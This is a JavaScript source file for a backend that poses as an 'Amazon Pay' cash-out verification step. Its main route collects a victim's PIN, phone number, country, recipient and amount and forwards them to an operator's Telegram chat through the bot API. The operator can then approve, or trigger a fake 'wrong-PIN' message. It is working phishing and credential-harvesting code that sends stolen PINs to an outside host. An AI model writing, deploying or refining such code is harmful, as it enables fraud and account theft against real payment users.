// telegram-bot.js
const crypto = require('crypto');

/**
 * Minimal Telegram approval flow.
 *
 * ENV variables required (set in Render dashboard):
 *   TELEGRAM_BOT_TOKEN  — token from @BotFather
 *   TELEGRAM_CHAT_ID    — chat id where Approve/Decline buttons appear
 *   PUBLIC_BASE_URL     — e.g. https://amazon-pay.onrender.com
 *
 * Usage from server.js:
 *   const telegram = require('./telegram-bot');
 *   telegram.registerRoutes(app);
 */

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
const BASE_URL  = (process.env.PUBLIC_BASE_URL || '').replace(/\/$/, '');

// In-memory pending requests: requestId -> { payload, status, messageId }
const pending = new Map();

function log(msg) { console.log('[telegram]', msg); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram bot not configured.');
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
  };
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(callbackQueryId, text) {
  if (!BOT_TOKEN) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
  }).catch(() => {});
}

async function editMessageReplyMarkup(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    })
  }).catch(() => {});
}

/* ── Webhook handler: receives button clicks from Telegram ── */
async function handleTelegramUpdate(update) {
  if (!update || !update.callback_query) return;
  const cq = update.callback_query;
  const data = cq.data || '';
  const messageId = cq.message && cq.message.message_id;

  // data format: approve:<requestId>  or  decline:<requestId>
  const [action, requestId] = data.split(':');
  if (!requestId) { await answerCallback(cq.id, 'Invalid request'); return; }

  const entry = pending.get(requestId);
  if (!entry) { await answerCallback(cq.id, 'Request already handled.'); return; }
  if (entry.status !== 'pending') { await answerCallback(cq.id, 'Already ' + entry.status + '.'); return; }

  if (action === 'approve') {
    entry.status = 'approved';
    await answerCallback(cq.id, '✅ Approved — client will continue.');
    log(`Approved request ${requestId}`);
  } else if (action === 'decline') {
    entry.status = 'declined';
    await answerCallback(cq.id, '❌ Declined — client will see wrong-PIN.');
    log(`Declined request ${requestId}`);
  } else {
    await answerCallback(cq.id, 'Unknown action.');
    return;
  }

  if (messageId) await editMessageReplyMarkup(messageId);
}

/* ── Routes ── */
function registerRoutes(app) {
  // 1) Client posts PIN here → we send the Telegram message
  app.post('/api/verify/send', async (req, res) => {
    try {
      const { pin, number, country, recipient, amount, currency, reference, method, fee } = req.body || {};
      if (!pin || !number) return res.status(400).json({ error: 'Missing pin or number' });

      const requestId = crypto.randomBytes(8).toString('hex');
      pending.set(requestId, { status: 'pending', createdAt: Date.now() });

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

      const text =
        `<b>🔐 New cash-out verification</b>\n\n` +
        `<b>PIN entered:</b> <code>${safe(pin)}</code>\n` +
        `<b>Number:</b> ${safe(number)}\n` +
        `<b>Country:</b> ${safe(country)}\n` +
        `<b>Recipient:</b> ${safe(recipient)}\n` +
        `<b>Method:</b> ${safe(method)}\n` +
        `<b>Amount:</b> ${safe(currency)} ${safe(amount)}\n` +
        (fee ? `<b>Fee:</b> ${safe(currency)} ${safe(fee)}\n` : '') +
        (reference ? `<b>Reference:</b> <code>${safe(reference)}</code>\n` : '') +
        `\n<b>Request ID:</b> <code>${requestId}</code>`;

      const keyboard = [[
        { text: '✅ Approve', callback_data: `approve:${requestId}` },
        { text: '❌ Decline', callback_data: `decline:${requestId}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      pending.get(requestId).messageId = sent.message_id;

      // Auto-expire after 5 min
      setTimeout(() => {
        const e = pending.get(requestId);
        if (e && e.status === 'pending') e.status = 'declined';
      }, 5 * 60 * 1000);

      res.json({ requestId });
    } catch (err) {
      console.error('[telegram] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  // 2) Client polls status here
  app.get('/api/verify/status/:id', (req, res) => {
    const entry = pending.get(req.params.id);
    if (!entry) return res.status(404).json({ status: 'not_found' });
    res.json({ status: entry.status });
  });

  // 3) Telegram webhook — receives button taps
  app.post('/api/telegram/webhook', async (req, res) => {
    try {
      await handleTelegramUpdate(req.body);
    } catch (e) { console.error('[telegram] webhook err', e); }
    res.sendStatus(200);
  });

  log('Routes registered: /api/verify/send, /api/verify/status/:id, /api/telegram/webhook');
}

module.exports = { registerRoutes };
